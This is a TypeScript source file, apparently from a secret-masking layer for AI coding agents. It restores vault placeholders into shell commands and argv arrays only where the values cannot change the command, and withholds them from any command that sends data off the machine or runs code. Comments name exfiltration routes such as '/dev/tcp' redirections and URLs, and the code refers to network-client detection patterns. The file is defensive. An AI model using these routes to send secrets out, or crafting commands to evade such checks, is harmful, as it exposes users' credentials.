/** A shell command with its safe placeholders restored. */
export interface ShellRestore {
  readonly command: string;
  /** One result per placeholder restored, or found unknown or foreign
   * (left literal, and counted as such by the caller). */
  readonly results: readonly RestoreResult[];
  /** The placeholders left literal because their value was not safe
   * where they stand, once per occurrence. Placeholders, never values. */
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders in a shell `command`, each only when its real
 * value is safe in the context at its position (`shellContextAt`), and
 * none in a command that sends data off the machine (`sendsOffMachine`).
 * The command is judged as received, then again with the values put back:
 * a value that makes it send data out or run code, or that moves where a
 * simple command or a heredoc body starts or ends (a value that reads as
 * the delimiter ends its heredoc early), keeps every placeholder.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellCommand(
  np: RestoreCapable,
  command: string,
  sessionId: string,
): ShellRestore {
  const starts = [...command.matchAll(placeholderPattern())].map((m) => m.index);
  const verdict = judge(command, starts);
  const keepAll = verdict.offMachine || verdict.runsCode;
  const shifts: Shift[] = [];
  const restored = restoreEach(
    np,
    command,
    sessionId,
    (value, at) => {
      if (keepAll || verdict.programAt.has(at)) return false;
      const context = verdict.contextAt.get(at) ?? 'none';
      // `$` or `${` just before it would make the value a parameter name
      // (`${HOME}`) wherever `$` expands.
      if (EXPANDING_CONTEXTS.has(context) && opensParameter(command, at)) return false;
      return shellSafe(value, context);
    },
    shifts,
  );
  if (restored.results.every((r) => r.replacements === 0)) return restored;
  // The values must not change what the command is: one restored as a
  // redirection to `/dev/tcp/…`, a URL, or a word that makes a program
  // run code keeps every placeholder, and so does one that changes how
  // the command splits.
  const after = judge(restored.command, []);
  const same = sameLayout(verdict.layout, after.layout, shifts);
  if (same && !after.offMachine && !after.runsCode) return restored;
  return restoreEach(np, command, sessionId, () => false);
}

/** True when `$` or `${` stands just before `at`, so that a value there
 * would complete a parameter expansion. */
function opensParameter(command: string, at: number): boolean {
  const before = command[at - 1];
  return before === '$' || (before === '{' && command[at - 2] === '$');
}

/** Where restoring one placeholder changed a command's length: at `at`
 * of the masked command, `from` characters became `to`. */
interface Shift {
  readonly at: number;
  readonly from: number;
  readonly to: number;
}

/** True when `after`, read from the restored command, splits exactly as
 * `before` (read from the masked one) once its offsets are moved by
 * `shifts`. */
function sameLayout(before: Layout, after: Layout, shifts: readonly Shift[]): boolean {
  const move = offsetMover(shifts);
  const same = (
    a: ReadonlyArray<readonly [number, number]>,
    b: ReadonlyArray<readonly [number, number]>,
  ): boolean =>
    a.length === b.length &&
    a.every(([start, end], k) => move(start) === b[k]?.[0] && move(end) === b[k]?.[1]);
  return same(before.commands, after.commands) && same(before.bodies, after.bodies);
}

/** Maps an offset of the masked command to the restored one; an offset
 * inside a restored placeholder maps to `undefined`. */
function offsetMover(shifts: readonly Shift[]): (offset: number) => number | undefined {
  const delta: number[] = [0];
  for (const s of shifts) delta.push((delta.at(-1) ?? 0) + s.to - s.from);
  return (offset) => {
    // How many shifts start before `offset`.
    let lo = 0;
    let hi = shifts.length;
    while (lo < hi) {
      const mid = (lo + hi) >>> 1;
      if ((shifts[mid]?.at ?? offset) < offset) lo = mid + 1;
      else hi = mid;
    }
    const last = shifts[lo - 1];
    if (last !== undefined && offset < last.at + last.from) return undefined;
    return offset + (delta[lo] ?? 0);
  };
}

/** A shell `command` given as an argv array, with its safe placeholders
 * restored. */
export interface ShellArgvRestore {
  readonly argv: readonly string[];
  readonly results: readonly RestoreResult[];
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders of a `command` given as an argv array, as
 * Codex's `shell` tool sends it (`["bash", "-lc", "…"]`). The program
 * runs without a shell, but the same rules hold as in a string command:
 * - nothing is restored when the program sends data off the machine, or
 *   runs code that may;
 * - a value is restored only as one plain word, never into the program
 *   itself, and never into the arguments of `cd`, `export` and the like;
 * - the script a shell runs (`bash -lc "…"`) is judged as a string
 *   command, program positions and data heredocs included.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellArgv(
  np: RestoreCapable,
  argv: readonly string[],
  sessionId: string,
): ShellArgvRestore {
  const length = argv.reduce((n, a) => n + a.length, 0);
  const offline = length <= MAX_COMMAND_CHARS && !argvSendsOffMachine(argv);
  const program = argvProgramIndex(argv);
  const script = shellScriptIndex(argv, program);
  // A program that runs code gets values back only inside the script a
  // shell runs, which is judged as a string command; nowhere else.
  const runs = argvProgram(argv);
  const code = argvRunsCode(argv) || runs === undefined || !takesDataArgs(runs);
  // As in shell code, the arguments of `cd`, `export` and the like get no
  // value.
  const held = runs?.name === 'cd' || ENVIRONMENT_BUILTINS.has(runs?.name ?? '');
  const first = restoreArgvWords(
    np,
    argv,
    sessionId,
    (position, value) => {
      if (!offline || position === program || position === 0) return false;
      if (code || held) return false;
      return PLAIN_WORD.test(value);
    },
    offline ? script : -1,
  );
  if (first.results.every((r) => r.replacements === 0)) return first;
  // As for a string command: the values must not change what it is.
  if (!argvSendsOffMachine(first.argv) && (code || !argvRunsCode(first.argv))) return first;
  return restoreArgvWords(np, argv, sessionId, () => false, -1);
}

/** Restore each word of `argv`: the shell script at `script` as a string
 * command, every other word where `safe` accepts the value. */
function restoreArgvWords(
  np: RestoreCapable,
  argv: readonly string[],
  sessionId: string,
  safe: (position: number, value: string) => boolean,
  script: number,
): ShellArgvRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  const restored = argv.map((word, position) => {
    const r =
      position === script
        ? restoreShellCommand(np, word, sessionId)
        : restoreEach(np, word, sessionId, (value) => safe(position, value));
    results.push(...r.results);
    keptMasked.push(...r.keptMasked);
    return r.command;
  });
  return { argv: restored, results, keptMasked };
}

/** Shells whose `-c` argument is a script. */
const ARGV_SHELLS: ReadonlySet<string> = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'mksh',
  'fish',
]);
/** A shell option cluster that holds `c`: the next argument is the script. */
const SCRIPT_FLAG = /^-[A-Za-z]*c[A-Za-z]*$|^--command$/;
/** Shell options that take the next argument (`-o pipefail`, `+O extglob`). */
const OPTION_WITH_ARGUMENT = /^[-+][A-Za-z]*[oO]$|^--(?:rcfile|init-file|init-command)$/;

/** The index of the program an argv array runs, past keywords,
 * assignments, redirections and wrappers. */
function argvProgramIndex(argv: readonly string[]): number {
  const words = argv.map((text) => ({ text, computed: false, start: 0, end: text.length }));
  let k = skipPrefix(words, 0);
  for (;;) {
    const text = words[k]?.text;
    if (text === undefined) return k;
    const name = normalise(text);
    const options = WRAPPERS.get(name);
    if (options === undefined) return k;
    k = skipWrapperArgs(words, k + 1, name, options).next;
  }
}

/** The index of the script a shell program runs with `-c`, or -1. */
function shellScriptIndex(argv: readonly string[], program: number): number {
  const name = argv[program];
  if (name === undefined || !ARGV_SHELLS.has(normalise(name))) return -1;
  for (let k = program + 1; k < argv.length; k++) {
    const word = argv[k] ?? '';
    if (SCRIPT_FLAG.test(word)) return k + 1;
    if (OPTION_WITH_ARGUMENT.test(word)) k += 1;
    else if (!word.startsWith('-') && !word.startsWith('+')) return -1;
  }
  return -1;
}

/** The program an argv array runs, every word literal. */
function argvProgram(argv: readonly string[]): Program | undefined {
  return programOf(argv.map((text) => ({ text, computed: false, start: 0, end: text.length })));
}

function argvRunsCode(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  return (
    (program !== undefined && runsCode(program)) || argv.some((a) => NESTED_INTERPRETER.test(a))
  );
}

/** True when an argv command sends data out: its program does, an
 * argument names a network client, or it runs code (each argument then
 * read as a shell command) that does. */
function argvSendsOffMachine(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  if (program !== undefined && sendsOut(program)) return true;
  if (program?.name !== undefined && ANY_DELIMITER_PROGRAMS.has(program.name)) return true;
  if (argv.some((a) => ANY_DELIMITER_IN_TEXT.test(a))) return true;
  if (argv.some((a) => NETWORK_CLIENT.test(a))) return true;
  if (!argvRunsCode(argv)) return false;
  return argv.some((a) => NETWORK_IN_CODE.test(a) || sendsOffMachine(a));
}

/** Restore each placeholder of `text` whose real value `safe` accepts at
 * the placeholder's index; leave the others literal. Each value put back
 * is noted in `shifts`, when given. */
function restoreEach(
  np: RestoreCapable,
  text: string,
  sessionId: string,
  safe: (value: string, at: number) => boolean,
  shifts?: Shift[],
): ShellRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  let out = '';
  let last = 0;
  for (const match of text.matchAll(placeholderPattern())) {
    const start = match.index;
    const placeholder = match[0];
    const r = np.restore(placeholder, sessionId);
    const ok = r.replacements === 0 || safe(r.restored, start);
    if (ok) results.push(r);
    else keptMasked.push(placeholder);
    if (ok && r.replacements > 0) {
      shifts?.push({ at: start, from: placeholder.length, to: r.restored.length });
    }
    out += text.slice(last, start) + (ok ? r.restored : placeholder);
    last = start + placeholder.length;
  }
  return { command: out + text.slice(last), results, keptMasked };
}

/** How many placeholders `text` holds. */
export function countPlaceholders(text: string): number {
  return placeholdersIn(text).length;
}

/** The placeholders `text` holds, in order, once per occurrence. */
export function placeholdersIn(text: string): string[] {
  return [...text.matchAll(placeholderPattern())].map((m) => m[0]);
}

/** A fresh global copy: `matchAll` needs the `g` flag, and a shared
 * global regex would carry `lastIndex` between callers. */
function placeholderPattern(): RegExp {
  return new RegExp(PLACEHOLDER_REGEX.source, 'g');
}
